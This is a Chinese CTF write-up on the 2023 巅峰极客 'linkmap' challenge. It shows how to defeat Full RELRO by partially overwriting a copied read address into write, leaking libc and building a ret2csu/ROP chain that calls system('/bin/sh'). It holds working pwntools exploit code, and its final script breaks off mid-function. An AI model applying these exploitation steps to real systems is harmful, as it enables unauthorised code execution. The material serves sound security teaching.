<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="aa1d661823ec70a4e04fc1f5f8a9776d">FULL RELRO下的低位覆盖</h1>
<h2 data-content="1" id="ad069f45b219187e72e1ae80dae9a5a9">前言</h2>
<p>前两天巅峰极客比赛遇到一种很有趣的攻击方式，这里来说一下我的理解并讲解一下比赛的题目</p>
<h2 data-content="1" id="3df42ab4f80dc0f8603010d5e92b3378">背景知识</h2>
<p>RELRO：堆栈地址随机化， 是一种用于加强对 binary 数据段的保护的技术<br/>
Partial RELRO：部分开启，got表可写<br/>
FULL RELRO：全部开启，got不可写</p>
<p>有的题开启了FULL RELRO后我们就不能在再去修改got表，如果条件更为苛刻的话，把输出函数去掉后，我们对栈溢出就利用就会困难更加困难，下面提供一种相对来说比较简单的思路去解决这个问题，也就是先把got表写到bss段上，再低位覆盖成输出函数，泄露完真实地址后再用基础的rop链去攻击。</p>
<h2 data-content="1" id="75218146ae215a1bc5ee60bc6fe5cc85">2023巅峰极客 linkmap</h2>
<h3 data-content="1" id="7d4a1ce989ece9dcc709256596257357">ida</h3>
<pre><code>Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)</code></pre>
<p>可以看到这里是got表不可写的</p>
<div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="p">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="p">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="m">16</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>

  <span class="n">setbuf</span><span class="p">();</span>
  <span class="n">read</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="m">0</span><span class="n">x100uLL</span><span class="p">);</span> <span class="c1">//buf = 0x10</span>
  <span class="k">return</span> <span class="m">0L</span><span class="n">L</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>main函数的内容只有这些</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230724143857-c3f13bf4-29ec-1.png"/><br/>
然后查看got表也没有输出函数，没有办法直接利用简单的rop链</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230724143904-c8330f62-29ec-1.png"/></p>
<p>查看一下这一排函数，其中有个函数比较特别 : sub_400606</p>
<div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="nf">sub_400606</span><span class="p">(</span><span class="n">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-8h]</span>

  <span class="n">v4</span> <span class="p">=</span> <span class="p">*(</span><span class="n">qword_601040</span> <span class="p">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">a1</span><span class="p">);</span>
  <span class="n">qword_601040</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="n">result</span> <span class="p">=</span> <span class="n">a1</span><span class="p">;</span>
  <span class="n">dword_601048</span> <span class="p">=</span> <span class="n">a1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="p">==</span> <span class="m">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
    <span class="n">qword_601028</span><span class="p">[</span><span class="n">a3</span><span class="p">]</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span> <span class="p">!</span><span class="n">a2</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
    <span class="n">qword_601020</span><span class="p">[</span><span class="n">a3</span><span class="p">]</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>让我们仔细分析一下这个函数，这个函数有a1，a2，a3三个参数，第一步会取 0x601040+a1 处二级指针存储的值，然后赋值给v4，然后再把v4的值赋值给0x601040处的指针变量(这里0x601040是在bss段)，这里估计是反编译的问题，他这个赋值可能不大形象，下面我用一个例子来解释一下这一步可以达到的效果</p>
<p>假设我们在0x601040处写入read_got，并且控制了sub_400606函数的第一个参数为a1=0(rdi=0),下面就会直接这三步<br/>
0x601040--&gt;read_got--&gt;read_addr<br/>
v4=read_addr<br/>
0x601040--&gt;read_addr<br/>
这样就达到了把read的真实地址写入可写的bss段上，这样我们便可以再次写0x601040的地址，也就可以低位覆盖后四位来写write，这里因为aslr的缘故，所以只是有几率覆盖成功</p>
<h3 data-content="1" id="ccf991eca4641ce0425e6965349d1a68">思路</h3>
<p>因为程序中没有控制rdx的gadget，所以我们用csu来控制rdi，rsi，rdx寄存器和程序执行流，然后我们要利用sub_400606函数去把read_addr写入0x601040处，之后还要让sub_400606函数返回read函数以达到修改的目的，这里仔细设置一下a1，a2，a3三个参数就可以达到这个效果。把write的地址写入进去后，我们得到了这样一个效果，addr1--&gt;write_addr，之后我们直接调用addr1就能利用write函数了，然后我们就可以泄露libc地址了，然后就利用基础的rop链去getshell就可以了。</p>
<h3 data-content="1" id="3f79c1d7ac72f2fb5c9924f2d1df37b1">详细流程</h3>
<p>先构造csu</p>
<pre><code>.text:00000000004007C0                               loc_4007C0:                             ; CODE XREF: init+54↓j
.text:00000000004007C0 4C 89 EA                      mov     rdx, r13
.text:00000000004007C3 4C 89 F6                      mov     rsi, r14
.text:00000000004007C6 44 89 FF                      mov     edi, r15d
.text:00000000004007C9 41 FF 14 DC                   call    qword ptr [r12+rbx*8]
.text:00000000004007C9
.text:00000000004007CD 48 83 C3 01                   add     rbx, 1
.text:00000000004007D1 48 39 EB                      cmp     rbx, rbp
.text:00000000004007D4 75 EA                         jnz     short loc_4007C0
.text:00000000004007D4
.text:00000000004007D6
.text:00000000004007D6                               loc_4007D6:                             ; CODE XREF: init+34↑j
.text:00000000004007D6 48 83 C4 08                   add     rsp, 8
.text:00000000004007DA 5B                            pop     rbx
.text:00000000004007DB 5D                            pop     rbp
.text:00000000004007DC 41 5C                         pop     r12
.text:00000000004007DE 41 5D                         pop     r13
.text:00000000004007E0 41 5E                         pop     r14
.text:00000000004007E2 41 5F                         pop     r15
.text:00000000004007E4 C3                            retn
.text:00000000004007E4                               ; } // starts at 400780
.text:00000000004007E4
.text:00000000004007E4                               init endp</code></pre>
<div class="highlight"><pre><span></span><span class="n">csu_front_addr</span> <span class="o">=</span> <span class="mh">0x4007C0</span>
<span class="n">csu_end_addr</span> <span class="o">=</span> <span class="mh">0x4007DA</span>

<span class="c1"># csu(0, 1, fun_got, rdx, rsi, rdi, last)</span>
<span class="k">def</span> <span class="nf">csu</span><span class="p">(</span><span class="n">rbx</span><span class="p">,</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">r12</span><span class="p">,</span> <span class="n">r15</span><span class="p">,</span> <span class="n">r14</span><span class="p">,</span> <span class="n">r13</span><span class="p">,</span> <span class="n">last</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_end_addr</span><span class="p">)</span> 
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">r12</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">r13</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">r14</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">r15</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_front_addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mh">0x38</span>  
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">last</span><span class="p">)</span>    
    <span class="k">return</span> <span class="n">payload</span>
</pre></div>
<p>这里就是先pop rbx,rbp,r12,r13,r14,r15<br/>
然后r13--&gt;rdx , r14--&gt;rsi , r15d--&gt;edi , 令rbx=0 ，r12--&gt;call , rbp==1 , rbp==rbx , 然后不跳转 ，最后写个返回函数就行<br/>
构造完csu后就可以做题了<br/>
版本:ubuntu22</p>
<div class="highlight"><pre><span></span><span class="n">pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x0000000000400570</span>
<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x00000000004007e3</span>
<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x00000000004007e1</span>
<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x400773</span>

<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x400740</span>
<span class="n">key_addr</span> <span class="o">=</span> <span class="mh">0x601040</span>
<span class="c1">#leave_ret = 0x400772</span>

<span class="n">read_plt</span> <span class="o">=</span> <span class="mh">0x4004E0</span>
<span class="n">read_got</span> <span class="o">=</span> <span class="mh">0x600FD8</span>

<span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x400606</span>
<span class="n">csu_front_addr</span> <span class="o">=</span> <span class="mh">0x4007C0</span>
<span class="n">csu_end_addr</span> <span class="o">=</span> <span class="mh">0x4007DA</span>
</pre></div>
<p>首先把这些地址放到这里，方便后面解释</p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">key_addr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p>首先把rsi的值设置为key_addr</p>
<pre><code>RAX  0xfffffffffffffe00
 RBX  0x0
 RCX  0x7fb531714992 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x100
 RDI  0x0
 RSI  0x601040 ◂— 0x0 
 R8   0x7fb53181af10 (initial+16) ◂— 0x4
 R9   0x7fb531852040 (_dl_fini) ◂— endbr64 
 R10  0x7fb53184c908 ◂— 0xd00120000000e
 R11  0x246
 R12  0x600fd8 —▸ 0x7fb531714980 (read) ◂— endbr64 
 R13  0x100
 R14  0x601040 ◂— 0x0
 R15  0x0
 RBP  0x1
 RSP  0x7ffe97a209f0 —▸ 0x4007cd ◂— add rbx, 1
 RIP  0x7fb531714992 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */</code></pre>
<p>然后再往里面写数据</p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230724144058-0c415588-29ed-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">key_addr</span><span class="o">+</span><span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p>这里就是去调用backdoor(sub_400606)函数，然后 rdi=0 , rsi=1 , rdx=0<br/>
这里解释一下后面两参数为什么要这么赋值</p>
<div class="highlight"><pre><span></span><span class="n">__int64</span> <span class="n">__fastcall</span> <span class="nf">sub_400606</span><span class="p">(</span><span class="n">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-8h]</span>

  <span class="n">v4</span> <span class="p">=</span> <span class="p">*(</span><span class="n">qword_601040</span> <span class="p">+</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">a1</span><span class="p">);</span>
  <span class="n">qword_601040</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="n">result</span> <span class="p">=</span> <span class="n">a1</span><span class="p">;</span>
  <span class="n">dword_601048</span> <span class="p">=</span> <span class="n">a1</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="p">==</span> <span class="m">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
    <span class="n">qword_601028</span><span class="p">[</span><span class="n">a3</span><span class="p">]</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span> <span class="p">!</span><span class="n">a2</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
    <span class="n">qword_601020</span><span class="p">[</span><span class="n">a3</span><span class="p">]</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>因为调用这个函数，最后返回值是result，这里我们想要返回read函数，以便于修改。<br/>
当我们令 a1=0 时，我们已经成功把read_addr写道key_addr上了</p>
<p>修改前：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230724144135-226c1276-29ed-1.png"/><br/>
修改后：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230724144143-27535722-29ed-1.png"/></p>
<div class="highlight"><pre><span></span><span class="err">然后我们要利用</span> <span class="n">a2</span> <span class="p">==</span> <span class="m">1</span> <span class="err">来进入这个判断：</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">a2</span> <span class="p">==</span> <span class="m">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
    <span class="n">qword_601028</span><span class="p">[</span><span class="n">a3</span><span class="p">]</span> <span class="p">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="p">}</span>
</pre></div>
<p>这样之后</p>
<div class="highlight"><pre><span></span><span class="n">result</span> <span class="p">=</span> <span class="n">v4</span> <span class="p">=</span> <span class="n">read_addr</span>
<span class="m">0</span><span class="n">x601028</span><span class="p">[</span><span class="m">0</span><span class="p">]</span> <span class="p">=</span> <span class="n">read_addr</span> <span class="p">(</span><span class="err">这里上图也可以看到</span><span class="p">)</span>
</pre></div>
<p>成功达到目的</p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">key_addr</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p>然后我们再利用read去修改read_addr的后四位</p>
<pre><code>pwndbg&gt; p read
$1 = {ssize_t (int, void *, size_t)} 0x7f3685114980 &lt;__GI___libc_read&gt;
pwndbg&gt; p write
$2 = {ssize_t (int, const void *, size_t)} 0x7f3685114a20 &lt;__GI___libc_write&gt;</code></pre>
<p>直接覆盖后四位为0x4a20</p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x4a20</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230724144246-4c7e55b0-29ed-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">key_addr</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
</pre></div>
<p>然后再去调用write，把read_addr泄露出来，也就泄露处libc了</p>
<div class="highlight"><pre><span></span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
<span class="n">leak</span><span class="p">(</span><span class="s2">"libc_base "</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230724144313-5c85b138-29ed-1.png"/><br/>
然后就用rop链正常打</p>
<div class="highlight"><pre><span></span><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">'/bin/sh'</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span>  <span class="s2">"a"</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230724144330-669b18d4-29ed-1.png"/></p>
<h3 data-content="1" id="45331efad4dc6a18ecb441000015a84c">exp</h3>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">"debug"</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span>
<span class="n">leak</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span>          <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'{} = {:#x}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
<span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\xf7</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>

<span class="n">x64_32</span> <span class="o">=</span> <span class="mi">1</span>

<span class="k">if</span> <span class="n">x64_32</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">'i386'</span>

<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="c1">#p=remote("pwn-3ca8173ee5.challenge.xctf.org.cn", 9999, ssl=True)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'gnome-terminal'</span><span class="p">,</span><span class="s1">'-x'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'-c'</span><span class="p">]</span>

<span class="n">pop_rbp_ret</span> <span class="o">=</span> <span class="mh">0x0000000000400570</span>
<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x00000000004007e3</span>
<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x00000000004007e1</span>
<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x400773</span>

<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x400740</span>
<span class="n">key_addr</span> <span class="o">=</span> <span class="mh">0x601040</span>

<span class="n">read_plt</span> <span class="o">=</span> <span class="mh">0x4004E0</span>
<span class="n">read_got</span> <span class="o">=</span> <span class="mh">0x600FD8</span>

<span class="n">backdoor</span> <span class="o">=</span> <span class="mh">0x400606</span>
<span class="n">csu_front_addr</span> <span class="o">=</span> <span class="mh">0x4007C0</span>
<span class="n">csu_end_addr</span> <span class="o">=</span> <span class="mh">0x4007DA</span>

<span class="k">def</span> <span class="nf">duan</span><span class="p">():</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>

<span class="c1"># csu(0, 1, fun_got, rdx, rsi, rdi, last)</span>
<span class="k">def</span> <span class="nf">csu</span><span class="p">(</span><span class="n">rbx</span><span class="p">,</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">r12</span><span class="p">,</span> <span class="n">r15</span><span class="p">,</span> <span class="n">r14</span><span class="p">,</span> <span class="n">r13</span><span class="p">,</span> <span class="n">last</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_end_addr</span><span class="p">)</span> 
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">r12</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">r13</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">r14</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">r15</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_front_addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mh">0x38</span>  
